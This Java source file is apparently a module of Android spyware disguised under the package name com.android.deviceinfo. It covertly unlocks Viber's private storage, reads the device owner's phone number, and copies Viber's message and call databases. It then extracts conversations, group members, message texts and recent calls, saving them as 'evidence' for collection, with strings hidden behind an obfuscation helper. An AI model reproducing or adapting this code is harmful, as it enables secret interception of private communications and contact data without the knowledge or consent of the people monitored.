package com.android.deviceinfo.module.chat;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.module.ModuleAddressBook;

import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

public class ChatViber extends SubModuleChat {
	private static final String TAG = "ChatViber";

	private static final int PROGRAM = 0x09;
	String pObserving = M.e("com.viber");

	static String dbDir = M.e("/data/data/com.viber.voip/databases");
	static String dbChatFile = M.e("viber_messages");
	static String dbCallFile = M.e("viber_data");

	private Long lastViberReadDate;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	ChatGroups groups = new ChatViberGroups();
	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();

	private String account;

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	public String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		readViberMessageHistory();
	}

	@Override
	protected void start() {
		lastViberReadDate = markup.unserialize(new Long(0));

		account = readAccount();
		if (account != null) {
			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.VIBER, account);
			readViberMessageHistory();
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastViber: " + lastViberReadDate);
		}
	}

	public static String readAccount() {
		String number = null;
		String file = M.e("/data/data/com.viber.voip/files/preferences/reg_viber_phone_num");

		if (Path.unprotect(file, 4, false)) {
			FileInputStream fileInputStream;
			try {
				fileInputStream = new FileInputStream(file);
				ObjectInputStream oInputStream = new ObjectInputStream(fileInputStream);
				Object one = oInputStream.readObject();
				number = (String) one;

			} catch (Exception e) {
				if (Cfg.DEBUG) {
					e.printStackTrace();
					Check.log(TAG + " (readMyPhoneNumber) Error: " + e);
				}
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (readMyPhoneNumber): %s", number);
		}
		return number;
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readViberMessageHistory() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readViberMessageHistory)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory), semaphore red");
			}
			return;
		}

		try {
			boolean updateMarkup = false;

			GenericSqliteHelper helper = openViberDBHelper();
			if (helper == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbChatFile);
				}
				return;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): can read DB");
			}
			helper.deleteAtEnd = false;
			// SQLiteDatabase db = helper.getReadableDatabase();

			groups = new ChatViberGroups();

			long newViberReadDate = 0;
			List<ViberConversation> conversations = getViberConversations(helper, account, lastViberReadDate);
			for (ViberConversation sc : conversations) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: " + sc.date);
				}

				// retrieves the lastConvId recorded as evidence for this
				// conversation
				String thread = Long.toString(sc.id);

				if (sc.isGroup() && !groups.hasMemoizedGroup(thread)) {
					fetchParticipants(helper, thread);
					groups.addPeerToGroup(thread, account);
				}

				long lastReadId = fetchMessages(helper, sc, lastViberReadDate);
				newViberReadDate = Math.max(newViberReadDate, lastReadId);

			}
			if (newViberReadDate > 0) {
				lastViberReadDate = newViberReadDate;
				updateMarkupViber(lastViberReadDate, true);
			}
			helper.deleteDb();

		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readViberMessageHistory) Error: ", ex);
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	public static GenericSqliteHelper openViberDBHelper() {
		return GenericSqliteHelper.openCopy(dbDir, dbCallFile);
	}

	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account,
			Long lastViberReadDate) {

		final List<ViberConversation> conversations = new ArrayList<ViberConversation>();

		String[] projection = new String[] { M.e("_id"), M.e("date"), M.e("recipient_number"), M.e("conversation_type") };
		String selection = "date > " + lastViberReadDate;

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				ViberConversation c = new ViberConversation();
				c.account = account;

				c.id = cursor.getLong(0);
				c.date = cursor.getLong(1);
				c.remote = cursor.getString(2);
				c.group = cursor.getInt(3) == 1;

				conversations.add(c);
				return c.id;
			}
		};

		helper.traverseRecords(M.e("conversations"), visitor);

		return conversations;
	}

	// fetch participants.
	private void fetchParticipants(GenericSqliteHelper helper, final String thread_id) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchParticipants) : " + thread_id);
		}

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				Long id = cursor.getLong(0);
				String number = cursor.getString(1);
				String name = cursor.getString(2);
				String display_name = cursor.getString(3);
				boolean itsme = cursor.getInt(4) == 0;

				Contact contact;

				if (itsme) {
					contact = new Contact(Long.toString(id), account, "", "");
				} else {
					contact = new Contact(Long.toString(id), number, name, display_name);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchParticipants) %s", contact);
				}

				if (number != null) {
					groups.addPeerToGroup(thread_id, contact);
				}
				return 0;
			}
		};

		String sqlquery = M
				.e("SELECT P._id,  I.number, I.display_name, I.contact_name, I.participant_type from participants as P join participants_info as I on P.participant_info_id = I._id where conversation_id = ?");
		helper.traverseRawQuery(sqlquery, new String[] { thread_id }, visitor);

	}

	private long fetchMessages(GenericSqliteHelper helper, final ViberConversation conversation, long lastConvId) {

		// select author, body_xml from Messages where convo_id == 118 and id >=
		// 101 and body_xml != ''
		try {
			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			String[] projection = new String[] { M.e("_id"), M.e("participant_id"), M.e("body"), M.e("date"),
					M.e("address"), M.e("type") };
			String selection = M.e("conversation_id = ") + conversation.id + M.e(" and date > ") + lastConvId;
			String order = "date";
			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {

				@Override
				public long cursor(Cursor cursor) {
					// I read a line in a conversation.
					int id = cursor.getInt(0);
					String peer = cursor.getString(1);
					String body = cursor.getString(2);
					long timestamp = cursor.getLong(3);
					String address = cursor.getString(4);
					boolean incoming = cursor.getInt(5) == 0;

					Date date = new Date(timestamp);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) peer: " + peer + " timestamp: " + timestamp + " incoming: "
								+ incoming);
					}

					boolean isGroup = conversation.isGroup();

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
					}

					String from, to = null;
					String fromDisplay, toDisplay = null;

					from = incoming ? address : conversation.account;
					fromDisplay = incoming ? address : conversation.account;

					Contact contact = groups.getContact(peer);
					String thread = Long.toString(conversation.id);
					if (isGroup) {
						// if (peer.equals("0")) {
						// peer = conversation.account;
						// }
						to = groups.getGroupToName(from, thread);
						toDisplay = to;
					} else {
						to = incoming ? conversation.account : conversation.remote;
						toDisplay = incoming ? conversation.account : conversation.remote;
					}

					if (!StringUtils.isEmpty(body)) {
						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
								body, incoming);

						if (Cfg.DEBUG) {
							Check.log(TAG + " (cursor) message: " + message.from + " "
									+ (message.incoming ? "<-" : "->") + " " + message.to + " : " + message.body);
						}
						messages.add(message);
					}

					return timestamp;
				}
			};

			long newLastId = helper.traverseRecords(M.e("messages"), visitor);

			if (messages != null && messages.size() > 0) {
				saveEvidence(messages);
			}

			return newLastId;
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (fetchMessages) Error: " + e);
			}
			return -1;
		}
	}

	private void updateMarkupViber(long newLastId, boolean serialize) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupViber),  +lastId: " + newLastId);
		}

		try {
			markup.writeMarkupSerializable(newLastId);

			Long verify = markup.unserialize(new Long(0));
			if (!lastViberReadDate.equals(verify)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateMarkupViber) Error: failed");
				}
			}

		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupViber) Error: " + e);
			}
		}
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
		String sqlQuery = "select _id,number,date,type  from calls order by _id desc limit 1";

		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				callInfo.id = cursor.getInt(0);
				callInfo.peer = cursor.getString(1);
				// callInfo.displayName = String sqlQuery;
				callInfo.timestamp = new Date(cursor.getLong(2));
				int type = cursor.getInt(3);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (cursor) call type: " + type);
				}
				callInfo.incoming = type == 1;
				callInfo.valid = true;

				return callInfo.id;
			}
		};

		helper.traverseRawQuery(sqlQuery, new String[] {}, visitor);
		return callInfo.valid;
	}

}